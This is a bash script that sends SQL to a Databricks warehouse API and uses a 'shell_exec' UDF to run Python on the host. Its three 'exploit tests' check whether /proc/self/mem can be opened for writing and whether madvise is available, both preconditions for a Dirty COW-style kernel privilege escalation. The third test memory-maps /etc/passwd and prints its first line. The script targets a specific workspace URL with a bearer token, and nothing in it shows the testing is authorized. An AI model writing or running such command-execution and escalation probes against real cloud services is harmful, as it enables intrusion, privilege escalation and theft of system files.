#!/bin/bash

TOKEN="REDACTED_DATABRICKS_TOKEN"
WORKSPACE="https://dbc-54d21f62-0426.cloud.databricks.com"
WAREHOUSE_ID="d8637cca1dc66ba3"

exec_sql() {
    local statement="$1"
    curl -s -X POST "$WORKSPACE/api/2.0/sql/statements" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"warehouse_id\": \"$WAREHOUSE_ID\",
        \"statement\": $(echo "$statement" | python3 -c "import sys, json; print(json.dumps(sys.stdin.read()))"),
        \"wait_timeout\": \"30s\"
      }" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    result = data.get('result', {}).get('data_array', [[]])
    if result and result[0]:
        print(result[0][0])
    else:
        print('[empty]')
except:
    print('[error]')
"
}

echo "═══ SIMPLIFIED EXPLOIT TESTS ═══"
echo ""

echo "[1] Check if we can open /proc/self/mem for write:"
exec_sql "SELECT workspace.default.shell_exec('python3 << EOF
import os
try:
    fd = os.open(\"/proc/self/mem\", os.O_RDWR)
    print(f\"SUCCESS: opened /proc/self/mem for RW, fd={fd}\")
    os.close(fd)
except Exception as e:
    print(f\"BLOCKED: {e}\")
EOF
')"
echo ""

echo "[2] Check madvise syscall:"
exec_sql "SELECT workspace.default.shell_exec('python3 << EOF
import ctypes
libc = ctypes.CDLL(None)
MADV_DONTNEED = 4
# Try madvise on NULL (will fail, but shows if syscall exists)
ret = libc.madvise(0, 1024, MADV_DONTNEED)
print(f\"madvise returned: {ret}\")
EOF
')"
echo ""

echo "[3] Test /etc/passwd mmap:"
exec_sql "SELECT workspace.default.shell_exec('python3 << EOF
import mmap
import os
try:
    with open(\"/etc/passwd\", \"r\") as f:
        mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ, flags=mmap.MAP_PRIVATE)
        print(f\"SUCCESS: mmapped /etc/passwd, size={len(mm)}\")
        print(f\"First line: {mm.readline()}\")
        mm.close()
except Exception as e:
    print(f\"ERROR: {e}\")
EOF
')"
echo ""

echo "═══ TESTS COMPLETE ═══"

